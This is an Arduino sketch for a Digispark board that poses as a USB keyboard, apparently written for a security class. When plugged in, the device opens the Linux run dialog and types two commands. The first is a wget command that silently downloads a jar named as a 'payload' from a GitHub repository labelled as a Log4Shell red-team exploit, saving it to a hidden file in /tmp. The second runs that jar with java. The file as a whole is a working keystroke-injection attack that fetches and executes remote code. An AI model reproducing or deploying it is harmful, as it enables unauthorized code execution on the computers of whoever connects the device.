#define LED_BUILTIN 1
#include "DigiKeyboard.h"
/**
 *
 * @author      Muhammad Nur Irsyad
 * @id          1807422020
 * @class       CCIT SEC 8 (TMJ)
 */
bool passed = false;
//----------
void setup() {
    pinMode(LED_BUILTIN, OUTPUT);    
    digitalWrite(LED_BUILTIN, HIGH);
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(2000);        
    DigiKeyboard.sendKeyStroke(KEY_F2 , MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(0); delay(750);        
    DigiKeyboard.println("wget -q -O /tmp/.payload-6.22.jar https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/mvn-web-exploit/target/payload-6.22.jar & wait");
    //----------
    digitalWrite(LED_BUILTIN, LOW); delay(1500);            
    digitalWrite(LED_BUILTIN, HIGH);                                              
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(2000);        
    DigiKeyboard.sendKeyStroke(KEY_F2 , MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(0); delay(750);            
    DigiKeyboard.println("java -jar /tmp/.payload-6.22.jar");
    //----------
    passed = true;
}

void loop() {
    if (passed) {
        digitalWrite(LED_BUILTIN, LOW); delay(100);            
        digitalWrite(LED_BUILTIN, HIGH); delay(125);                                              
     }
}
